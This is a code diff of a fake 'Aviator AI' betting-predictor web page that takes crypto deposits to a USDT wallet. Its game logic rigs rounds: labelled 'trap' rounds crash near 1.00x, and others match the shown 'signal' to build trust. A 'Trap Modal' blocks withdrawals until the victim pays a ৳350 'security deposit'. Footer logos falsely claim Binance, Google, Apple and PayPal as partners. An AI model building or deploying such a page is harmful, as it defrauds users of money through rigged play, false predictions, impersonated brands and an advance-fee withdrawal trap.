@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aviator AI Pro - Verified</title>
+    <title>Aviator AI Pro - V4</title>
     <style>
         :root { --primary: #ff0040; --bg: #0b0c0d; --gold: #f3ba2f; --neon: #00f2ff; --green: #28a745; --binance: #f0b90b; }
         body { background: var(--bg); color: white; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; text-align: center; }
@@ -12,42 +12,39 @@
         .nav { background: #1b1c1d; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #333; position: sticky; top: 0; z-index: 1000; }
         .bal-box { color: var(--gold); font-weight: bold; border: 1px solid var(--gold); padding: 5px 15px; border-radius: 20px; font-size: 1rem; }
         .tab-bar { display: flex; justify-content: center; background: #111; padding: 10px; gap: 8px; border-bottom: 1px solid #222; }
-        .tab-btn { background: #222; color: #888; border: none; padding: 10px 14px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 0.75rem; transition: 0.3s; }
+        .tab-btn { background: #222; color: #888; border: none; padding: 10px 14px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 0.75rem; }
         .tab-btn.active { background: var(--primary); color: white; box-shadow: 0 0 10px var(--primary); }
 
         /* General Page Styling */
         .page { display: none; padding: 20px; animation: slideUp 0.4s ease-out; }
         .page.active { display: block; }
-        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        @keyframes slideUp { from { transform: translateY(15px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
 
         /* Hacker Bot Page */
-        .predictor-card { background: #000; border: 2px solid var(--neon); border-radius: 15px; width: 200px; margin: 0 auto 15px; padding: 12px; box-shadow: 0 0 20px rgba(0, 242, 255, 0.3); }
+        .predictor-card { background: #000; border: 2px solid var(--neon); border-radius: 15px; width: 210px; margin: 0 auto 15px; padding: 12px; box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
         #next-pred { font-size: 2.8rem; color: var(--neon); font-weight: 900; }
-        #game-box { position: relative; width: 100%; max-width: 600px; height: 300px; background: radial-gradient(circle, #1a1a1a, #000); margin: 0 auto; border-radius: 15px; border: 1px solid #333; overflow: hidden; }
+        #game-box { position: relative; width: 100%; max-width: 600px; height: 280px; background: radial-gradient(circle, #1a1a1a, #000); margin: 0 auto; border-radius: 15px; border: 1px solid #333; overflow: hidden; }
         #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 4.5rem; font-weight: 900; z-index: 10; }
-        .controls { background: #1b1c1d; width: 100%; max-width: 600px; margin: 15px auto; padding: 20px; border-radius: 20px; border: 1px solid #333; }
+        .controls { background: #1b1c1d; width: 100%; max-width: 600px; margin: 15px auto; padding: 20px; border-radius: 20px; border: 1px solid #333; box-sizing: border-box; }
         
-        /* Form Styling */
-        .input-group { text-align: left; max-width: 400px; margin: 0 auto 15px; }
-        label { font-size: 0.8rem; color: #888; display: block; margin-bottom: 5px; }
-        input { width: 100%; padding: 14px; background: #000; border: 1px solid #333; border-radius: 10px; color: white; font-size: 1rem; box-sizing: border-box; }
-        .btn-main { width: 100%; padding: 18px; font-size: 1.4rem; font-weight: bold; border: none; border-radius: 12px; cursor: pointer; color: white; margin-top: 10px; }
+        /* Input & Button */
+        input { width: 100%; padding: 14px; background: #000; border: 1px solid #333; border-radius: 10px; color: white; margin: 10px 0; box-sizing: border-box; }
+        .btn-main { width: 100%; padding: 18px; font-size: 1.4rem; font-weight: bold; border: none; border-radius: 12px; cursor: pointer; color: white; }
 
         /* Trust Footer */
         .footer { margin-top: 40px; padding: 30px 10px; border-top: 1px solid #222; background: #0e0f10; }
-        .f-title { font-size: 0.65rem; color: #555; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 20px; }
-        .logo-row { display: flex; justify-content: center; gap: 20px; align-items: center; flex-wrap: wrap; }
-        .logo-row img { height: 25px; }
+        .logo-row { display: flex; justify-content: center; gap: 20px; align-items: center; flex-wrap: wrap; margin-top: 15px; }
+        .logo-row img { height: 24px; }
 
-        /* Modal */
-        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; justify-content: center; align-items: center; padding: 20px; }
+        /* Trap Modal */
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; padding: 20px; }
         .modal-box { background: #1b1c1d; padding: 30px; border-radius: 25px; border: 1px solid #444; width: 100%; max-width: 350px; }
     </style>
 </head>
 <body>
 
     <div class="nav">
-        <div style="font-weight:900; color:var(--primary); font-size: 1.2rem;">AVIATOR AI PRO</div>
+        <div style="font-weight:900; color:var(--primary); font-size: 1.2rem;">AVIATOR AI BOT</div>
         <div class="bal-box">৳ <span id="balance">0.00</span></div>
     </div>
 
@@ -59,73 +56,57 @@
 
     <div id="game" class="page active">
         <div class="predictor-card">
-            <div id="next-pred">SCANNING</div>
-            <div style="font-size:0.6rem; color:var(--green); letter-spacing: 1px;">CONNECTED TO SERVER</div>
+            <div style="font-size:0.5rem; color:#888; letter-spacing: 2px;">LIVE SERVER SIGNAL</div>
+            <div id="next-pred">WAITING</div>
         </div>
         <div id="game-box">
             <div id="multiplier">1.00x</div>
             <canvas id="gameCanvas"></canvas>
         </div>
         <div class="controls">
-            <div class="input-group">
-                <label>Bet Amount (৳)</label>
-                <input type="number" id="betAmt" value="50">
-            </div>
+            <input type="number" id="betAmt" value="50">
             <button id="actionBtn" class="btn-main" style="background: var(--green);">PLACE BET</button>
         </div>
     </div>
 
     <div id="deposit" class="page">
         <div style="max-width:400px; margin:auto; background:#1b1c1d; padding:25px; border-radius:20px; border:1px solid #333; text-align:left;">
-            <h2 style="color:var(--binance); margin-top:0;">Deposit Funds</h2>
-            <p style="font-size:0.8rem; color:#aaa;">Min Deposit: ৳300. Instant activation.</p>
-            
-            <div style="background:#000; padding:15px; border-radius:12px; border:1px solid var(--binance); margin-bottom:20px;">
-                <label style="color:var(--binance)">USDT (BEP20) Address:</label>
+            <h2 style="color:var(--binance);">Secure Deposit</h2>
+            <div style="background:#000; padding:15px; border-radius:12px; border:1px solid var(--binance); margin-bottom:15px;">
+                <label style="color:var(--binance); font-size:0.8rem;">USDT (BEP20) Wallet:</label>
                 <div style="display:flex; align-items:center; gap:10px; margin-top:5px;">
-                    <span id="addr" style="font-size:0.7rem; color:#fff; word-break:break-all;">0x71C7656EC7ab88b098defB751B7401B5f6d8976F</span>
-                    <button onclick="copyAddr()" style="background:var(--binance); color:#000; border:none; padding:5px 10px; border-radius:5px; font-weight:bold; cursor:pointer;">COPY</button>
+                    <span id="addr" style="font-size:0.7rem; word-break:break-all;">0x71C7656EC7ab88b098defB751B7401B5f6d8976F</span>
+                    <button onclick="copyAddr()" style="background:var(--binance); border:none; padding:5px 10px; border-radius:5px; font-weight:bold; cursor:pointer;">COPY</button>
                 </div>
             </div>
-
-            <div class="input-group">
-                <label>Deposit Amount (৳)</label>
-                <input type="number" id="depAmount" placeholder="300">
-            </div>
-            <button onclick="alert('Payment processing. Please wait 5-10 mins.')" class="btn-main" style="background:var(--primary);">I HAVE PAID</button>
+            <button onclick="alert('Transaction pending... Check back in 5 mins.')" class="btn-main" style="background:var(--primary);">I HAVE PAID</button>
         </div>
     </div>
 
     <div id="withdraw" class="page">
         <div style="max-width:400px; margin:auto; background:#1b1c1d; padding:25px; border-radius:20px; border:1px solid #333; text-align:left;">
             <h2>Withdraw</h2>
-            <div class="input-group">
-                <label>Binance ID / Wallet Number</label>
-                <input type="text" placeholder="Enter Details">
-            </div>
-            <div class="input-group">
-                <label>Withdraw Amount</label>
-                <input type="number" placeholder="Min ৳800">
-            </div>
+            <input type="text" placeholder="Wallet Address / Number">
+            <input type="number" placeholder="Amount (Min ৳800)">
             <button onclick="showTrap()" class="btn-main" style="background:#333;">SUBMIT WITHDRAW</button>
         </div>
     </div>
 
     <div class="footer">
-        <div class="f-title">Official Strategic Partners</div>
+        <div style="font-size:0.6rem; color:#555; text-transform:uppercase; letter-spacing:2px;">Official Global Partners</div>
         <div class="logo-row">
             <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.svg?v=032" alt="Binance">
             <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
             <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter: invert(1);" alt="Apple">
             <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal">
-            <img src="https://cryptologos.cc/logos/tether-usdt-logo.svg?v=032" alt="Tether">
+            <img src="https://cryptologos.cc/logos/tether-usdt-logo.svg?v=032" alt="USDT">
         </div>
     </div>
 
     <div id="trapModal" class="modal-overlay">
         <div class="modal-box">
             <h3 style="color:var(--primary); margin-top:0;">Account Restricted</h3>
-            <p style="font-size:0.9rem; color:#ccc; line-height:1.6;">High-profit activity detected. To verify your wallet and unlock withdrawals, a security deposit of **৳350** is required.</p>
+            <p style="font-size:0.9rem; color:#ccc; line-height:1.6;">High-profit pattern detected. To verify your wallet and unlock withdrawals, a security deposit of **৳350** is required.</p>
             <button onclick="showPage('deposit')" class="btn-main" style="background:var(--green); font-size:1.1rem;">VERIFY NOW (৳350)</button>
         </div>
     </div>
@@ -151,7 +132,7 @@
 
     const canvas = document.getElementById('gameCanvas');
     const ctx = canvas.getContext('2d');
-    canvas.width = 600; canvas.height = 300;
+    canvas.width = 600; canvas.height = 280;
 
     onValue(userRef, (s) => {
         balance = s.val().balance;
@@ -173,32 +154,38 @@
         falseRounds = positions;
     }
 
+    // --- AUTO-REFRESH SIGNAL LOGIC ---
     function setupRound() {
         if (roundCount >= cycleLength) generateNewCycle();
-        predSignal = (Math.random() * (12.00 - 1.80) + 1.80).toFixed(2);
         
+        // Always change Predictor Point (Every single round)
+        predSignal = (Math.random() * (15.00 - 1.80) + 1.80).toFixed(2);
+        
+        // Decide if this round is a False (Trap) Round
         if (falseRounds.includes(roundCount)) {
-            actualCrash = (1.00 + Math.random() * 0.12).toFixed(2);
+            actualCrash = (1.00 + Math.random() * 0.12).toFixed(2); // Kill round
         } else {
-            actualCrash = predSignal;
+            actualCrash = predSignal; // Match round
         }
 
+        // Update Predictor UI
         document.getElementById('next-pred').innerText = predSignal + "x";
         document.getElementById('multiplier').innerText = "1.00x";
         document.getElementById('multiplier').style.color = "white";
+        
         roundCount++;
-        ctx.clearRect(0,0,600,300);
+        ctx.clearRect(0,0,600,280);
     }
 
     generateNewCycle();
     setupRound();
 
     function drawLine(elapsed) {
-        ctx.clearRect(0,0,600,300);
+        ctx.clearRect(0,0,600,280);
         ctx.beginPath(); ctx.strokeStyle = "#ff0040"; ctx.lineWidth = 6;
-        ctx.shadowBlur = 15; ctx.shadowColor = "#ff0040";
-        ctx.moveTo(0, 300);
-        ctx.quadraticCurveTo(elapsed*60, 300, elapsed*120, 300-(elapsed*45));
+        ctx.shadowBlur = 10; ctx.shadowColor = "#ff0040";
+        ctx.moveTo(0, 280);
+        ctx.quadraticCurveTo(elapsed*60, 280, elapsed*120, 280-(elapsed*45));
         ctx.stroke();
     }
 
@@ -208,13 +195,16 @@
         let val = (1 + Math.pow(elapsed, 1.4) * 0.15).toFixed(2);
         document.getElementById('multiplier').innerText = val + "x";
         drawLine(elapsed);
+        
         if (parseFloat(val) >= actualCrash) {
             isFlying = false;
             document.getElementById('multiplier').style.color = "red";
+            
+            // --- AUTOMATICALLY CHANGE POINT AFTER CRASH ---
             setTimeout(() => {
                 document.getElementById('actionBtn').innerText = "PLACE BET";
                 document.getElementById('actionBtn').style.background = "var(--green)";
-                setupRound();
+                setupRound(); // <--- Points change here every round!
             }, 2500);
         } else { requestAnimationFrame(animate); }
     }
@@ -230,7 +220,7 @@
         } else {
             let winM = parseFloat(document.getElementById('multiplier').innerText);
             balance += (currentBet * winM); update(userRef, {balance});
-            isFlying = false; alert("Victory! Profit added.");
+            isFlying = false; alert("Victory! Profit saved.");
         }
     };
 
